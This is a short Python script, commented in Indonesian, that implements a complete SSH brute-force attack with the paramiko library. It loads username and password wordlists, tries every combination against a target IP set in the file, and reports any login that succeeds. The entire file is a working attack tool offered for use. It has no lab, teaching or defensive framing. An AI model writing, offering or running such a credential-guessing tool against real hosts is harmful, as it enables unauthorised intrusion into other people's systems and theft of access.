import paramiko
import itertools
import time

# Konfigurasi
TARGET_IP = "192.168.1.1"  # Ganti dengan IP target
TARGET_PORT = 22
USER_WORDLIST = "userlist.txt"  # File berisi daftar username
PASSWORD_WORDLIST = "passwordlist.txt"  # File berisi daftar password
DELAY_BETWEEN_ATTEMPTS = 0.5  # Delay antar percobaan (detik)

def ssh_bruteforce(target_ip, target_port, user_list, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for username, password in itertools.product(user_list, password_list):
        try:
            print(f"[TRYING] Username: {username} | Password: {password}")
            client.connect(
                hostname=target_ip,
                port=target_port,
                username=username.strip(),
                password=password.strip(),
                timeout=5,
                banner_timeout=5
            )
            print(f"[SUCCESS] Username: {username} | Password: {password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(f"[FAILED] Username: {username} | Password: {password}")
        except Exception as e:
            print(f"[ERROR] {e}")
        time.sleep(DELAY_BETWEEN_ATTEMPTS)
    
    client.close()
    return False

if __name__ == "__main__":
    print("[INFO] Starting SSH brute force attack...")
    
    # Baca daftar username dan password dari file
    with open(USER_WORDLIST, "r") as user_file, open(PASSWORD_WORDLIST, "r") as pass_file:
        user_list = user_file.readlines()
        password_list = pass_file.readlines()
    
    # Mulai brute force
    success = ssh_bruteforce(TARGET_IP, TARGET_PORT, user_list, password_list)
    
    if success:
        print("[INFO] Brute force berhasil!")
    else:
        print("[INFO] Brute force gagal. Tidak ada kombinasi yang cocok.")
